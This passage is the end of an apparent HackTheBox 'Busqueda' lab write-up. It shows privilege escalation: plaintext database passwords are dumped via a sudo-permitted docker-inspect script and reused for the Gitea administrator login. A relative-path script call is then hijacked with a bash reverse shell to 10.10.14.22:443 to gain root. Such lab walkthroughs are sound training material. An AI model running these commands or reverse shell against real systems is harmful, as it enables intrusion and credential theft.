+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">python3</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">system</span><span class="o">-</span><span class="nx">checkup</span><span class="p">.</span><span class="nx">py</span> <span class="o">*</span>
+</span></span></code></pre></div><p>It seems we can see the <code>[system-checkup.py](http://system-checkup.py)</code> as <code>root</code> user, although we did not have any permissions to read the file./</p>
+<ul>
+<li>If you request a field which is itself a structure containing other fields, by default you get a Go-style dump of the inner values. Docker adds a template function, <code>json</code> , which can be applied to get results in JSON format.</li>
+</ul>
+<p>Normally, it provided 3 functionalities, 2 for docker related commands and one for system check</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">python3</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">scripts</span><span class="o">/</span><span class="nx">system</span><span class="o">-</span><span class="nx">checkup</span><span class="p">.</span><span class="nx">py</span> <span class="nx">docker</span><span class="o">-</span><span class="nx">inspect</span> <span class="o">--</span><span class="nx">format</span><span class="o">=</span><span class="s1">&#39;{{json .Config}}&#39;</span> <span class="mi">960873171</span><span class="nx">e2e</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">er</span><span class="err">-</span><span class="na">inspect</span> <span class="err">--</span><span class="na">format</span><span class="o">=</span><span class="s">&#39;{{json .Config}}&#39;</span> <span class="na">960873171e2e</span>
+</span></span><span class="line"><span class="cl"><span class="err">--</span><span class="na">format</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Hostname&#34;</span><span class="o">:</span><span class="s2">&#34;960873171e2e&#34;</span><span class="p">,</span><span class="s2">&#34;Domainname&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;User&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;AttachStdin&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;AttachStdout&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;AttachStderr&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;ExposedPorts&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;22/tcp&#34;</span><span class="o">:</span><span class="p">{},</span><span class="s2">&#34;3000/tcp&#34;</span><span class="o">:</span><span class="p">{}},</span><span class="s2">&#34;Tty&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;OpenStdin&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;StdinOnce&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;Env&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;USER_UID=115&#34;</span><span class="p">,</span><span class="s2">&#34;USER_GID=121&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA__database__DB_TYPE=mysql&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA__database__HOST=db:3306&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA__database__NAME=gitea&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA__database__USER=gitea&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;</span><span class="p">,</span><span class="s2">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class="p">,</span><span class="s2">&#34;USER=git&#34;</span><span class="p">,</span><span class="s2">&#34;GITEA_CUSTOM=/data/gitea&#34;</span><span class="p">],</span><span class="s2">&#34;Cmd&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;/bin/s6-svscan&#34;</span><span class="p">,</span><span class="s2">&#34;/etc/s6&#34;</span><span class="p">],</span><span class="s2">&#34;Image&#34;</span><span class="o">:</span><span class="s2">&#34;gitea/gitea:latest&#34;</span><span class="p">,</span><span class="s2">&#34;Volumes&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;/data&#34;</span><span class="o">:</span><span class="p">{},</span><span class="s2">&#34;/etc/localtime&#34;</span><span class="o">:</span><span class="p">{},</span><span class="s2">&#34;/etc/timezone&#34;</span><span class="o">:</span><span class="p">{}},</span><span class="s2">&#34;WorkingDir&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;Entrypoint&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;/usr/bin/entrypoint&#34;</span><span class="p">],</span><span class="s2">&#34;OnBuild&#34;</span><span class="o">:</span><span class="kc">null</span><span class="p">,</span><span class="s2">&#34;Labels&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;com.docker.compose.config-hash&#34;</span><span class="o">:</span><span class="s2">&#34;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.container-number&#34;</span><span class="o">:</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.oneoff&#34;</span><span class="o">:</span><span class="s2">&#34;False&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project&#34;</span><span class="o">:</span><span class="s2">&#34;docker&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project.config_files&#34;</span><span class="o">:</span><span class="s2">&#34;docker-compose.yml&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project.working_dir&#34;</span><span class="o">:</span><span class="s2">&#34;/root/scripts/docker&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.service&#34;</span><span class="o">:</span><span class="s2">&#34;server&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.version&#34;</span><span class="o">:</span><span class="s2">&#34;1.29.2&#34;</span><span class="p">,</span><span class="s2">&#34;maintainer&#34;</span><span class="o">:</span><span class="s2">&#34;maintainers@gitea.io&#34;</span><span class="p">,</span><span class="s2">&#34;org.opencontainers.image.created&#34;</span><span class="o">:</span><span class="s2">&#34;2022-11-24T13:22:00Z&#34;</span><span class="p">,</span><span class="s2">&#34;org.opencontainers.image.revision&#34;</span><span class="o">:</span><span class="s2">&#34;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&#34;</span><span class="p">,</span><span class="s2">&#34;org.opencontainers.image.source&#34;</span><span class="o">:</span><span class="s2">&#34;https://github.com/go-gitea/gitea.git&#34;</span><span class="p">,</span><span class="s2">&#34;org.opencontainers.image.url&#34;</span><span class="o">:</span><span class="s2">&#34;https://github.com/go-gitea/gitea&#34;</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="na">bash</span><span class="err">-</span><span class="na">5.1</span><span class="err">$</span> <span class="na">sudo</span> <span class="err">/</span><span class="na">usr</span><span class="err">/</span><span class="na">bin</span><span class="err">/</span><span class="na">python3</span> <span class="err">/</span><span class="na">opt</span><span class="err">/</span><span class="na">scripts</span><span class="err">/</span><span class="na">system</span><span class="err">-</span><span class="na">checkup.py</span> <span class="na">docker</span><span class="err">-</span><span class="na">inspect</span> <span class="err">--</span><span class="na">format</span><span class="o">=</span><span class="s">&#39;{{json .Config}}&#39;</span> <span class="na">f84a6b33fb5a</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span><span class="na">er</span><span class="err">-</span><span class="na">inspect</span> <span class="err">--</span><span class="na">format</span><span class="o">=</span><span class="s">&#39;{{json .Config}}&#39;</span> <span class="na">f84a6b33fb5a</span>
+</span></span><span class="line"><span class="cl"><span class="err">--</span><span class="na">format</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Hostname&#34;</span><span class="o">:</span><span class="s2">&#34;f84a6b33fb5a&#34;</span><span class="p">,</span><span class="s2">&#34;Domainname&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;User&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;AttachStdin&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;AttachStdout&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;AttachStderr&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;ExposedPorts&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;3306/tcp&#34;</span><span class="o">:</span><span class="p">{},</span><span class="s2">&#34;33060/tcp&#34;</span><span class="o">:</span><span class="p">{}},</span><span class="s2">&#34;Tty&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;OpenStdin&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;StdinOnce&#34;</span><span class="o">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">&#34;Env&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_USER=gitea&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_DATABASE=gitea&#34;</span><span class="p">,</span><span class="s2">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class="p">,</span><span class="s2">&#34;GOSU_VERSION=1.14&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_MAJOR=8.0&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_VERSION=8.0.31-1.el8&#34;</span><span class="p">,</span><span class="s2">&#34;MYSQL_SHELL_VERSION=8.0.31-1.el8&#34;</span><span class="p">],</span><span class="s2">&#34;Cmd&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;mysqld&#34;</span><span class="p">],</span><span class="s2">&#34;Image&#34;</span><span class="o">:</span><span class="s2">&#34;mysql:8&#34;</span><span class="p">,</span><span class="s2">&#34;Volumes&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;/var/lib/mysql&#34;</span><span class="o">:</span><span class="p">{}},</span><span class="s2">&#34;WorkingDir&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;Entrypoint&#34;</span><span class="o">:</span><span class="p">[</span><span class="s2">&#34;docker-entrypoint.sh&#34;</span><span class="p">],</span><span class="s2">&#34;OnBuild&#34;</span><span class="o">:</span><span class="kc">null</span><span class="p">,</span><span class="s2">&#34;Labels&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;com.docker.compose.config-hash&#34;</span><span class="o">:</span><span class="s2">&#34;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.container-number&#34;</span><span class="o">:</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.oneoff&#34;</span><span class="o">:</span><span class="s2">&#34;False&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project&#34;</span><span class="o">:</span><span class="s2">&#34;docker&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project.config_files&#34;</span><span class="o">:</span><span class="s2">&#34;docker-compose.yml&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.project.working_dir&#34;</span><span class="o">:</span><span class="s2">&#34;/root/scripts/docker&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.service&#34;</span><span class="o">:</span><span class="s2">&#34;db&#34;</span><span class="p">,</span><span class="s2">&#34;com.docker.compose.version&#34;</span><span class="o">:</span><span class="s2">&#34;1.29.2&#34;</span><span class="p">}}</span>
+</span></span></code></pre></div><p>Although from the <code>docker-ps</code> and <code>docker-inspect</code> , we got the information about the running containers, in which there was plaintext password for the database users, trying the same passwords on the <code>gitea.searcher.htb</code> for <code>administrator</code> user</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">administrator</span><span class="o">:</span><span class="nx">yuiu1hoiu4i5ho1uh</span>
+</span></span></code></pre></div><p>Now, we can successfully login to the application as <code>administrator</code> user and a see a repository called <code>scripts</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Upon checking the repository, it contained the <code>[system-checkup.py](http://system-checkup.py)</code> python file which we can analyse to see anything interesting of any sort, what we can see here is, it is using the <code>subprocess</code> to run commands, there was an interesting part in the code which was executing the <code>[full-checkup.sh](http://full-checkup.sh)</code> from the current directory instead of using absolute path for the script, this can be used in our advantage to create a <code>full-checkup.sh</code> in our directory and then run the <code>system-checkup.py</code> as <code>root</code> user which will execute the custom created <code>full-checkup.sh</code> script:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_4.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Creating the <code>[full-checkup.sh](http://full-checkup.sh)</code> with the reverse shell code and giving it the execute permission:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">full</span><span class="o">-</span><span class="nx">checkup</span><span class="p">.</span><span class="nx">sh</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="o">!</span><span class="err">/bin/bash</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span> <span class="o">-</span><span class="nx">i</span> <span class="o">&gt;&amp;</span> <span class="err">/dev/tcp/10.10.14.22/443 0&gt;&amp;1</span>
+</span></span></code></pre></div><p>Now, just execute the command and we got the reverse shell as root:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_5.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/inject-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Inject</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-07-08 00:00:00 &#43;0000 UTC">8 July 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/mailroom-htb/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Mailroom</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-08-19 00:00:00 &#43;0000 UTC">19 August 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
